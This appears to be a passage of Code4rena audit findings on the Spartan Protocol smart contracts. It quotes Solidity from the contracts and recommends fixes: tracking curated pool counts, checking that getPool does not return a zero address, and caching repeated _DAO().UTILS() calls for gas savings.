iUTILS(_DAO().UTILS()).calcLiquidityHoldings(_actualInputUnits, BASE, address(this)); // Get the SPARTA value of LP units         outputToken = iUTILS(_DAO().UTILS()).calcLiquidityHoldings(_actualInputUnits, TOKEN, address(this)); // Get the TOKEN value of LP units         _decrementPoolBalances(outputBase, outputToken); // Update recorded BASE and TOKEN amounts         _burn(address(this), _actualInputUnits); // Burn the LP tokens         iBEP20(BASE).transfer(member, outputBase); // Transfer the SPARTA to user         iBEP20(TOKEN).transfer(member, outputToken); // Transfer the TOKENs to user         emit RemoveLiquidity(member, outputBase, outputToken, _actualInputUnits);         return (outputBase, outputToken);     } ## Tools Used  ## Recommended Mitigation Steps Create a variable curatedPoolCount and increase it in addCuratedPool and decrease it in removeCuratedPool   
# Handle  gpersoon   # Vulnerability details  ## Impact The function getPool doesn't check if the pool exits (e.g. it doesn't check if the resulting pool !=0) Other functions use the results of getPool and do followup actions.  For example createSynth checks isCuratedPool(_pool) == true; if somehow isCuratedPool(0) would set to be true, then further actions could be done. As far as I can see no actual problem occurs, but this is a dangerous construction and future code changes could introduce vulnerabilities. Additionally the reverts that will occur if the result of getPool==0 are perhaps difficult to troubleshoot.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/poolFactory.sol#L119     function getPool(address token) public view returns(address pool){         if(token == address(0)){             pool = mapToken_Pool[WBNB];   // Handle BNB         } else {             pool = mapToken_Pool[token];  // Handle normal token         }          return pool;     }  function createPoolADD(uint256 inputBase, uint256 inputToken, address token) external payable returns(address pool){         require(getPool(token) == address(0)); // Must be a valid token       function createPool(address token) external onlyDAO returns(address pool){         require(getPool(token) == address(0)); // Must be a valid token       // https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/synthFactory.sol#L37  function createSynth(address token) external returns(address synth){         require(getSynth(token) == address(0), "exists"); // Synth must not already exist         address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(token); // Get pool address         require(iPOOLFACTORY(_DAO().POOLFACTORY()).isCuratedPool(_pool) == true, "!curated"); // Pool must be Curated   ## Tools Used  ## Recommended Mitigation Steps In function getPool add something like: require  (pool !=0, "Pool doesn't exist");  Note: the functions createPoolADD and createPool also have to be changed, to use a different way to verify the pool doesn't exist.   
# Handle  gpersoon   # Vulnerability details  ## Impact Sometimes the reference to function calls, that are done via the DAO, are looked up multiple times in one function call. For example mintSynth calls:  ​ -   _DAO() 4x -   _DAO().UTILS() 3x  This can be done more efficient by caching the result of _DAO() and _DAO().UTILS()  f## Proof of Concept // https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L229 ​function mintSynth(address synthOut, address member) external returns(uint outputAmount, uint fee) {        ​require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synthOut) == true, "!synth"); // Must be a valid Synth      ​..        ​uint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, tokenAmount); // Calculate value of swapping SPARTA to the relevant underlying TOKEN        ​uint _liquidityUnits = iUTILS(_DAO().UTILS()).calcLiquidityUnitsAsym(_actualInputBase, address(this)); // Calculate LP tokens to be minted       ​..        ​uint _fee = iUTILS(_DAO().UTILS()).calcSwapFee(_actualInputBase, baseAmount, tokenAmount); // Calc slip fee in TOKEN        ​fee = iUTILS(_DAO().UTILS()).calcSpotValueInBase(TOKEN, _fee); // Convert TOKEN fee to SPARTA        ​  function _DAO() internal view returns(iDAO) {        ​return iBASE(BASE).DAO();    ​}  //https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L624 ​function UTILS() public view returns(iUTILS){        ​if(daoHasMoved){            ​return Dao(DAO).UTILS();        ​} else {            ​return _UTILS;        ​}    ​}  ## Tools Used  ## Recommended Mitigation Step Cache _DAO() and cache the sub functions like: _DAO().UTILS()) If called multiple times from function  
